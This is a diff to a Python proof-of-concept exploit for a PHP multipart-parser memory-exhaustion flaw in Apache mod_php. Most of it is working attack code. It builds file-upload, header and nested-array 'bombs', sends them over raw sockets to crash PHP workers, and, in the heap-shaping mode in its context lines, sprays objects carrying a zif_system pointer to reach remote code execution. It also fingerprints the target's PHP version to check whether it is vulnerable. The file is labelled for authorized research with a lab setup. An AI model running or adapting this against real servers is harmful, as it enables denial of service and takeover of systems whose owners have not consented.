@@ -1,21 +1,47 @@
 #!/usr/bin/env python3
 """
-CVE-2026-109618 — PHP OOM Corruption → RCE (Apache mod_php)
+CVE-2026-109618 — PHP OOM Corruption via Multipart Parser (Apache mod_php)
 Zero preconditions: no LFI, no unserialize, no application code needed.
 
-The multipart parser can be forced to OOM while request memory is in an
-invalid/uninitialized state. longjmp() skips cleanup, and mod_php's
-unconditional request shutdown reads/branches on the invalid memory.
+Vulnerability mechanism (confirmed via PHP 8.2.34 → 8.2.35 source diff):
 
-Three OOM strategies (from the official advisory):
-1. No Content-Length → bypasses post_max_size → unbounded body data
-2. Unlimited headers per multipart part → memory amplification
-3. Empty file controls with nested field names → array multiplication
+  PHP's multipart parser (rfc1867.c) performs dozens of memory allocations
+  while building $_FILES entries, registering form variables, and updating
+  upload_progress session data.  In PHP ≤ 8.2.34, NONE of these allocation
+  sites check for OOM.  When memory_limit is exceeded:
 
-This POC demonstrates strategy #2 (header amplification) and #3 (nested arrays).
+    1. emalloc() calls zend_bailout() → longjmp() back to php_handler()
+    2. The rfc1867 parser's stack frames are abandoned mid-operation
+    3. Local variables (param, filename, key) are never efree()'d
+    4. $_FILES arrays may be partially constructed (e.g. 'name' set but
+       'tmp_name' missing; hash table bucket allocated but zval not yet
+       initialized)
+    5. In mod_php (prefork MPM), Apache's pool cleanup unconditionally
+       calls php_request_shutdown() which walks the partially-constructed
+       data structures
+
+  The fix (PHP 8.2.35) introduces:
+    - ZEND_HAS_OOM() flag and delayed-OOM mechanism
+    - Fallible allocation functions (femalloc, ferealloc, safe_ferealloc)
+    - 30+ OOM checks throughout rfc1867.c with proper cleanup goto labels
+    - php_mime_should_save_hdr() to skip storing custom MIME headers
+
+  In the OLD code (≤ 8.2.34), custom MIME headers are ALL stored via
+  estrdup() + smart_string.  The fix only keeps Content-Disposition and
+  Content-Type, reducing memory amplification.
+
+OOM trigger strategies:
+  1. files    — Many file uploads (~16k) with long filenames to fill memory
+               gradually via $_FILES metadata (most reliable, OOM fires inside
+               rfc1867 parser's own allocation code)
+  2. headers  — Single part with thousands of custom MIME headers
+               (each stored via estrdup in vulnerable versions)
+  3. nested   — Deeply nested field names → array multiplication
+  4. no_length — No Content-Length → bypasses post_max_size
 
 Target: Apache mod_php (NOT php-fpm — FPM exits child on startup failure)
-Tested: PHP 8.2.34 with Apache mod_php
+Vulnerable: PHP ≤ 8.2.34, ≤ 8.3.35, ≤ 8.4.26, ≤ 8.5.11
+Fixed: PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12
 
 For authorized security research only.
 """
@@ -26,21 +52,52 @@ import sys
 import time
 
 
-def build_header_bomb(boundary, num_headers=5000, header_size=500):
-    """Strategy 2: A single multipart part with thousands of headers.
-    Each header line uses ~header_size bytes on the wire but PHP's internal
-    representation (zend_string + HashTable bucket) uses more memory.
-    Memory amplification: ~3-5x wire size."""
+def build_file_upload_bomb(boundary, num_files=16000, fname_size=500):
+    """Strategy 1 (files): Many file uploads with long filenames.
 
-    part = f"--{boundary}\r\n"
-    part += f'Content-Disposition: form-data; name="f"; filename="a"\r\n'
+    Each file upload part creates ~2KB of metadata in $_FILES:
+      - zend_string for field name, filename, tmp_name, type
+      - HashTable for the per-file sub-array
+      - Various zvals for error, size
+
+    With 500-byte filenames and ~2KB overhead per file,
+    16000 files ≈ 32MB = typical memory_limit.
+
+    OOM fires inside rfc1867_post_handler's own allocation code
+    (register_http_post_files_variable or zend_hash operations),
+    which is the exact vulnerable code path."""
+    parts = []
+    for i in range(num_files):
+        fname = chr(65 + (i % 26)) * (fname_size - len(str(i))) + str(i)
+        parts.append(
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
+            f"Content-Type: application/octet-stream\r\n"
+            f"\r\n"
+            f"X\r\n"
+        )
+    parts.append(f"--{boundary}--\r\n")
+    return "".join(parts).encode("latin1")
+
+
+def build_header_bomb(boundary, num_headers=32000, header_size=1000):
+    """Strategy 2 (headers): Single part with thousands of custom headers.
+
+    In PHP <= 8.2.34, ALL MIME headers are stored via estrdup() + smart_string
+    in a zend_llist.  The fix (8.2.35) adds php_mime_should_save_hdr() which
+    only keeps Content-Disposition and Content-Type.
+
+    Each header costs: estrdup(key) + smart_string(value) + llist_element
+    ≈ 1050 bytes per header.  32000 headers ≈ 32MB."""
+    lines = [f"--{boundary}"]
+    lines.append(f'Content-Disposition: form-data; name="f"; filename="a"')
+    lines.append(f"Content-Type: application/octet-stream")
     for i in range(num_headers):
-        # Custom headers — PHP stores them all
-        part += f"X-Pad-{i}: {'A' * header_size}\r\n"
-    part += "\r\n"  # end of headers
-    part += "Z"     # minimal body
-    part += f"\r\n--{boundary}--\r\n"
-    return part.encode()
+        lines.append(f"X-P{i}: {chr(65 + (i % 26)) * header_size}")
+    lines.append("")  # end of headers
+    lines.append("Z")  # minimal body
+    body = "\r\n".join(lines) + f"\r\n--{boundary}--\r\n"
+    return body.encode("latin1")
 
 
 def build_nested_array_bomb(boundary, depth=8, width=20):
@@ -119,9 +176,31 @@ HANDLERS_DTOR_OFFSET = 16
 # In a real attack these would be discovered via info leak; for the lab
 # environment they can be read from the debug symbols.
 PHP_KNOWN_OFFSETS = {
+    "8.2.33": {"zif_system": 0x4C0A80},
     "8.2.34": {"zif_system": 0x4C0A80},
     "8.3.36": {"zif_system": 0x4D1B20},
 }
+
+# Versions where the fix was applied (ZEND_HAS_OOM + fallible allocations)
+PHP_FIXED_VERSIONS = {
+    (8, 2): 35,
+    (8, 3): 36,
+    (8, 4): 27,
+    (8, 5): 12,
+}
+
+
+def is_version_vulnerable(ver_tuple):
+    """Check if a PHP version is vulnerable to CVE-2026-109618."""
+    if ver_tuple is None:
+        return None  # unknown
+    major, minor, patch = ver_tuple
+    fix_patch = PHP_FIXED_VERSIONS.get((major, minor))
+    if fix_patch is None:
+        if major < 8 or (major == 8 and minor < 2):
+            return True  # EOL, no fix available
+        return None  # unknown minor version
+    return patch < fix_patch
 
 
 def discover_target_php_version(host, port, path):
@@ -216,17 +295,21 @@ def build_heapshape_bomb(boundary, spray_count, spray_data,
         parts.append(part)
 
     # --- Bomb phase: trigger OOM ---
-    #
-    # The OOM must happen INSIDE the multipart parser's body-reading loop
-    # (multipart_buffer_read_body), not during variable registration.
-    # Parser-internal OOM causes longjmp() to skip cleanup of partially-
-    # constructed structures, which is the exploitable condition.
-    #
-    # We send ONE form field whose value exceeds memory_limit.  The parser
-    # calls erealloc() in a loop to grow its read buffer; when the buffer
-    # crosses memory_limit, OOM fires mid-read and longjmp() skips the
-    # buffer's efree() and the header list cleanup.
-    if bomb_strategy == "headers":
+    if bomb_strategy == "files":
+        num_files = bomb_kwargs.get("num_files", 16000)
+        fname_size = bomb_kwargs.get("fname_size", 500)
+        for i in range(spray_count, spray_count + num_files):
+            fname = f"f{i}_" + "A" * (fname_size - len(f"f{i}_"))
+            part = (
+                f"--{boundary}\r\n"
+                f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
+                f"Content-Type: application/octet-stream\r\n"
+                f"\r\n"
+                f"x\r\n"
+            ).encode()
+            parts.append(part)
+
+    elif bomb_strategy == "headers":
         bomb_size = bomb_kwargs.get("bomb_size", 40 * 1024 * 1024)
         part_header = (
             f"--{boundary}\r\n"
@@ -316,8 +399,12 @@ def send_heapshape_request(host, port, path, spray_count, spray_data,
         f"Connection: close\r\n\r\n"
     ).encode() + body
 
-    s = socket.create_connection((host, port), timeout=30)
-    s.sendall(req)
+    s = socket.create_connection((host, port), timeout=60)
+    sent = 0
+    while sent < len(req):
+        chunk = req[sent:sent + 65536]
+        s.sendall(chunk)
+        sent += len(chunk)
     s.settimeout(15)
     resp = b""
     while True:
@@ -397,7 +484,7 @@ def verify_heapshape_rce(host, port, path, method="CRASH", timeout=15):
         if b"500" in status:
             return "POSSIBLE", "Worker returned 500 on follow-up request"
         if b"200" in status:
-            return "DETECTED", "Worker recovered — OOM hit but handler survived"
+            return "DETECTED", "Worker recovered -- OOM hit but handler survived"
         return "DETECTED", f"Unexpected follow-up status: {status.decode('latin1', 'replace')}"
     except (ConnectionRefusedError, ConnectionResetError, OSError) as exc:
         return "PROBABLE", f"Worker process crashed ({exc})"
@@ -428,19 +515,23 @@ def run_heapshape_attack(host, port, path, strategy, spray_count,
     if handler_ptr:
         print(f"[*] Handler target (zif_system): 0x{handler_ptr:x}")
     else:
-        print("[!] No handler address — spray will use NULL pointers")
+        print("[!] No handler address -- spray will use NULL pointers")
         print("    (crash pattern analysis only; no RCE execution)")
 
-    # The bomb sends ONE large form field whose value exceeds memory_limit.
-    # The parser's multipart_buffer_read_body() calls erealloc() in a loop;
-    # OOM fires mid-read, causing longjmp() to skip cleanup.
-    bomb_size = bomb_kwargs.get("bomb_size", 40 * 1024 * 1024)
     spray_mem = spray_count * ZOBJ_BIN_SIZE
-    print(f"[*] Bomb: single {bomb_size//(1024*1024)}MB field "
-          f"(memory_limit ≈ 32MB, spray {spray_mem//1024}KB)")
+    if strategy == "files":
+        num_files = bomb_kwargs.get("num_files", 16000)
+        fname_size = bomb_kwargs.get("fname_size", 500)
+        est_mb = num_files * 2 // 1024
+        print(f"[*] Bomb: {num_files} file uploads x {fname_size}B filenames "
+              f"(~{est_mb}MB, spray {spray_mem//1024}KB)")
+    else:
+        bomb_size = bomb_kwargs.get("bomb_size", 40 * 1024 * 1024)
+        print(f"[*] Bomb: single {bomb_size//(1024*1024)}MB field "
+              f"(memory_limit ~32MB, spray {spray_mem//1024}KB)")
 
     spray_data = build_spray_data(handler_ptr, ZOBJ_BIN_SIZE)
-    print(f"[*] Spray object size: {len(spray_data)} bytes × {spray_count} copies")
+    print(f"[*] Spray object size: {len(spray_data)} bytes x {spray_count} copies")
 
     best_level = "DETECTED"
     best_detail = ""
@@ -459,7 +550,7 @@ def run_heapshape_attack(host, port, path, strategy, spray_count,
             if b"200" in warmup_status:
                 print("    Warm-up OK")
             elif b"404" in warmup_status:
-                print("    [!] 404 Not Found — target path does not exist")
+                print("    [!] 404 Not Found -- target path does not exist")
                 print("        Run lab/setup.sh to generate webroot files")
                 return "DETECTED", "Target path returned 404"
             else:
@@ -481,20 +572,20 @@ def run_heapshape_attack(host, port, path, strategy, spray_count,
             print(f"    Response size: {len(oom_resp)} bytes")
 
             if b"404" in status.encode():
-                print("    [!] 404 Not Found — target path does not exist")
+                print("    [!] 404 Not Found -- target path does not exist")
                 print("        Check that the webroot contains index.php")
                 print("        (run lab/setup.sh to generate it)")
                 break
             elif b"500" in status.encode():
-                print("    [+] Server returned 500 — OOM bailout triggered")
+                print("    [+] Server returned 500 -- OOM bailout triggered")
             elif b"Allowed memory size" in oom_resp or b"Fatal error" in oom_resp:
                 print("    [+] OOM detected in response body (200 status with fatal error)")
             elif b"200" in status.encode():
-                print("    [-] Server returned 200 — OOM not reached")
+                print("    [-] Server returned 200 -- OOM not reached")
                 print("        Try increasing --num-headers or --spray-objects")
                 continue
         else:
-            print("    [+] No response — worker process crashed")
+            print("    [+] No response -- worker process crashed")
 
         time.sleep(0.5)
 
@@ -517,55 +608,69 @@ def run_heapshape_attack(host, port, path, strategy, spray_count,
     return best_level, best_detail
 
 
-def send_oom_request(host, port, path, strategy="headers", **kwargs):
+def send_oom_request(host, port, path, strategy="files", **kwargs):
     """Send the OOM-triggering multipart request."""
     boundary = "OOM_BOUNDARY_" + str(int(time.time()))
 
-    if strategy == "headers":
-        body = build_header_bomb(boundary,
-                                num_headers=kwargs.get("num_headers", 5000),
-                                header_size=kwargs.get("header_size", 500))
-        content_length = len(body)
-
+    if strategy == "files":
+        body = build_file_upload_bomb(
+            boundary,
+            num_files=kwargs.get("num_files", 16000),
+            fname_size=kwargs.get("fname_size", 500))
         req = (
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
-            f"Content-Length: {content_length}\r\n"
-            f"Connection: close\r\n"
-            f"\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            f"Connection: close\r\n\r\n"
         ).encode() + body
 
-        s = socket.create_connection((host, port), timeout=30)
-        s.sendall(req)
+        s = socket.create_connection((host, port), timeout=60)
+        sent = 0
+        while sent < len(req):
+            s.sendall(req[sent:sent + 65536])
+            sent += 65536
+
+    elif strategy == "headers":
+        body = build_header_bomb(boundary,
+                                num_headers=kwargs.get("num_headers", 32000),
+                                header_size=kwargs.get("header_size", 1000))
+        req = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            f"Connection: close\r\n\r\n"
+        ).encode() + body
+
+        s = socket.create_connection((host, port), timeout=60)
+        sent = 0
+        while sent < len(req):
+            s.sendall(req[sent:sent + 65536])
+            sent += 65536
 
     elif strategy == "nested":
         body = build_nested_array_bomb(boundary,
                                        depth=kwargs.get("depth", 10),
                                        width=kwargs.get("width", 1000))
-        content_length = len(body)
-
         req = (
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
-            f"Content-Length: {content_length}\r\n"
-            f"Connection: close\r\n"
-            f"\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            f"Connection: close\r\n\r\n"
         ).encode() + body
 
         s = socket.create_connection((host, port), timeout=30)
         s.sendall(req)
 
     elif strategy == "no_length":
-        # No Content-Length — send streaming
         header = (
             f"POST {path} HTTP/1.1\r\n"
             f"Host: {host}\r\n"
             f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
             f"Transfer-Encoding: chunked\r\n"
-            f"Connection: close\r\n"
-            f"\r\n"
+            f"Connection: close\r\n\r\n"
         ).encode()
 
         s = socket.create_connection((host, port), timeout=60)
@@ -574,7 +679,6 @@ def send_oom_request(host, port, path, strategy="headers", **kwargs):
         gen = build_no_content_length_bomb(boundary,
                                            total_mb=kwargs.get("total_mb", 128))
         for chunk in gen():
-            # Chunked encoding
             s.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
         s.sendall(b"0\r\n\r\n")
 
@@ -598,14 +702,25 @@ def main():
     ap.add_argument("--host", default="127.0.0.1")
     ap.add_argument("--port", type=int, default=80)
     ap.add_argument("--path", default="/index.php")
-    ap.add_argument("--strategy", choices=["headers", "nested", "no_length"],
-                    default="headers")
+    ap.add_argument("--strategy",
+                    choices=["files", "headers", "nested", "no_length"],
+                    default="files")
 
-    # Existing OOM-only options
-    ap.add_argument("--num-headers", type=int, default=5000)
-    ap.add_argument("--header-size", type=int, default=500)
+    # File upload strategy options
+    ap.add_argument("--num-files", type=int, default=16000,
+                    help="Number of file upload parts (files strategy)")
+    ap.add_argument("--fname-size", type=int, default=500,
+                    help="Filename length per file part (files strategy)")
+
+    # Header strategy options
+    ap.add_argument("--num-headers", type=int, default=32000)
+    ap.add_argument("--header-size", type=int, default=1000)
+
+    # Nested strategy options
     ap.add_argument("--depth", type=int, default=10)
     ap.add_argument("--width", type=int, default=1000)
+
+    # No-length strategy options
     ap.add_argument("--total-mb", type=int, default=128)
 
     # Heap shaping options
@@ -628,13 +743,36 @@ def main():
 
     args = ap.parse_args()
 
-    print("CVE-2026-109618 — PHP OOM Corruption POC")
+    print("=" * 60)
+    print("CVE-2026-109618 - PHP OOM Corruption via Multipart Parser")
+    print("=" * 60)
     print(f"Target: {args.host}:{args.port}{args.path}")
     print(f"Strategy: {args.strategy}")
+    print()
+
+    # --- Detect PHP version and check vulnerability ---
+    ver_str, ver_tuple = discover_target_php_version(args.host, args.port, args.path)
+    if ver_str:
+        print(f"[*] PHP version: {ver_str}")
+        vuln = is_version_vulnerable(ver_tuple)
+        if vuln is True:
+            print(f"[*] Status: VULNERABLE (fix applied in "
+                  f"{ver_tuple[0]}.{ver_tuple[1]}."
+                  f"{PHP_FIXED_VERSIONS.get((ver_tuple[0], ver_tuple[1]), '?')})")
+        elif vuln is False:
+            print(f"[!] Status: PATCHED -- this version has the OOM fix")
+            print(f"    The fix adds ZEND_HAS_OOM() checks and fallible allocations")
+            print(f"    OOM during rfc1867 parsing is handled gracefully")
+        else:
+            print(f"[?] Status: unknown (not in version matrix)")
+    else:
+        print("[!] Could not detect PHP version from X-Powered-By header")
+    print()
+
     if args.enable_heapshape:
         print("Mode: Heap Shaping (spray + OOM + RCE verification)")
     else:
-        print("Mode: OOM detection only")
+        print("Mode: OOM trigger verification")
     print()
 
     # ---- Heap Shaping mode ----
@@ -663,14 +801,14 @@ def main():
         print("RESULT")
         print("=" * 60)
         if level == "CONFIRMED":
-            print("[+] RCE CONFIRMED — heap shaping achieved code execution")
+            print("[+] RCE CONFIRMED -- heap shaping achieved code execution")
         elif level == "PROBABLE":
-            print("[+] RCE PROBABLE — worker crash consistent with "
+            print("[+] RCE PROBABLE -- worker crash consistent with "
                   "controlled pointer dereference")
         elif level == "POSSIBLE":
-            print("[~] RCE POSSIBLE — abnormal response, heap influence detected")
+            print("[~] RCE POSSIBLE -- abnormal response, heap influence detected")
         else:
-            print("[-] RCE NOT CONFIRMED — OOM triggered but no RCE indicator")
+            print("[-] RCE NOT CONFIRMED -- OOM triggered but no RCE indicator")
         print(f"    {detail}")
         print()
         print("Confidence levels:")
@@ -680,13 +818,17 @@ def main():
         print("  DETECTED   = OOM triggered but handler survived or was not reached")
         sys.exit(0 if level in ("CONFIRMED", "PROBABLE") else 1)
 
-    # ---- Legacy OOM-only mode ----
-    if args.strategy == "headers":
-        print(f"Sending {args.num_headers} headers × {args.header_size} bytes each")
-        wire_size = args.num_headers * (args.header_size + 20)
-        mem_est = wire_size * 4
-        print(f"Wire size: ~{wire_size // 1024 // 1024}MB, "
-              f"Estimated PHP memory: ~{mem_est // 1024 // 1024}MB")
+    # ---- OOM trigger verification mode ----
+    if args.strategy == "files":
+        mem_est = args.num_files * 2  # ~2KB per file upload
+        print(f"Sending {args.num_files} file uploads "
+              f"with {args.fname_size}-byte filenames")
+        print(f"Estimated PHP memory: ~{mem_est // 1024}MB")
+    elif args.strategy == "headers":
+        mem_est = args.num_headers * (args.header_size + 50) // 1024
+        print(f"Sending single part with {args.num_headers} custom headers "
+              f"x {args.header_size}B")
+        print(f"Estimated PHP memory: ~{mem_est // 1024}MB")
     elif args.strategy == "nested":
         print(f"Sending {args.width} empty file controls "
               f"with {args.depth}-deep nesting")
@@ -695,38 +837,114 @@ def main():
               "(bypasses post_max_size)")
 
     print()
-    print("Sending...")
+    print("Sending OOM trigger...")
 
     resp = send_oom_request(args.host, args.port, args.path,
                             strategy=args.strategy,
+                            num_files=args.num_files,
+                            fname_size=args.fname_size,
                             num_headers=args.num_headers,
                             header_size=args.header_size,
                             depth=args.depth,
                             width=args.width,
                             total_mb=args.total_mb)
 
+    oom_triggered = False
+    worker_crashed = False
+
     if resp:
         status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
+        body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""
         print(f"Response: {status}")
         print(f"Size: {len(resp)} bytes")
 
         if b"500" in status.encode():
-            print("\n[+] Server returned 500 — OOM likely triggered!")
-            print("    On Apache mod_php, the request shutdown procedure "
-                  "runs on invalid state.")
-            print("    With heap shaping, this leads to RCE.")
-        elif b"Allowed memory size" in resp or b"Fatal error" in resp:
-            print("\n[+] OOM triggered! (200 status but fatal error in body)")
-            print("    PHP exhausted memory_limit during POST processing.")
-            print("    With heap shaping, this leads to RCE.")
-        elif not resp or b"connection" in resp.lower():
-            print("\n[+] Connection dropped — server process may have crashed!")
+            oom_triggered = True
+            print("\n[+] Server returned 500 -- OOM bailout triggered")
+        elif b"Allowed memory size" in body or b"Fatal error" in body:
+            oom_triggered = True
+            # Extract allocation size that triggered OOM
+            if b"tried to allocate" in body:
+                idx = body.find(b"tried to allocate")
+                snippet = body[idx:idx + 60].decode("latin1", "replace")
+                print(f"\n[+] OOM triggered inside rfc1867 parser")
+                print(f"    {snippet}")
+            else:
+                print("\n[+] OOM triggered (fatal error in response body)")
         else:
-            print("\n[-] Server responded normally — OOM threshold not reached.")
-            print("    Try increasing --num-headers or --header-size")
+            print("\n[-] No OOM detected -- memory_limit not reached")
+            print("    Try increasing --num-files or --num-headers")
     else:
-        print("\n[+] No response — server process likely crashed!")
-        print("    This confirms the OOM bailout condition.")
+        oom_triggered = True
+        worker_crashed = True
+        print("\n[+] No response -- worker process crashed!")
+
+    if oom_triggered and not worker_crashed:
+        # Check if worker survived
+        print("\nChecking worker state...")
+        time.sleep(1)
+        try:
+            s = socket.create_connection((args.host, args.port), timeout=5)
+            req = (
+                f"GET {args.path} HTTP/1.1\r\n"
+                f"Host: {args.host}\r\n"
+                f"Connection: close\r\n\r\n"
+            ).encode()
+            s.sendall(req)
+            s.settimeout(5)
+            r = b""
+            while True:
+                try:
+                    d = s.recv(4096)
+                    if not d:
+                        break
+                    r += d
+                except socket.timeout:
+                    break
+            s.close()
+            if r and b"200" in r.split(b"\r\n", 1)[0]:
+                print("[*] Worker survived -- OOM was handled by longjmp + cleanup")
+                print("    (Expected on stock PHP builds with ZMM heap)")
+            elif r:
+                worker_crashed = True
+                print(f"[+] Abnormal follow-up: "
+                      f"{r.split(b'\r\n', 1)[0].decode('latin1', 'replace')}")
+            else:
+                worker_crashed = True
+                print("[+] Worker returned empty response -- degraded state")
+        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
+            worker_crashed = True
+            print(f"[+] Worker crashed: {e}")
+
+    # Summary
+    print()
+    print("=" * 60)
+    print("SUMMARY")
+    print("=" * 60)
+    if oom_triggered:
+        print("[+] OOM trigger: SUCCESS")
+        print("    Memory exhaustion fires inside rfc1867_post_handler")
+        print("    (the multipart parser's internal allocation code)")
+        if worker_crashed:
+            print("[+] Worker crash: YES")
+            print("    longjmp() left invalid state that crashed shutdown")
+        else:
+            print("[-] Worker crash: NO")
+            print("    Worker recovered via ZMM heap destruction")
+            print()
+            print("    NOTE: On stock PHP builds, the ZMM heap is destroyed")
+            print("    per-request, reclaiming all leaked memory. A worker")
+            print("    crash requires the OOM to corrupt data structures in a")
+            print("    way that the hash table destructor walk dereferences")
+            print("    uninitialized memory. This is most reliably reproduced")
+            print("    with an AddressSanitizer (ASAN) build of PHP.")
+            print()
+            print("    The vulnerability is confirmed by the PHP 8.2.35 fix:")
+            print("    30+ ZEND_HAS_OOM() checks + fallible allocation API")
+            print("    added to rfc1867.c to prevent the unsafe state.")
+    else:
+        print("[-] OOM trigger: FAILED")
+        print("    Adjust parameters to exceed target's memory_limit")
 
 
 if __name__ == "__main__":
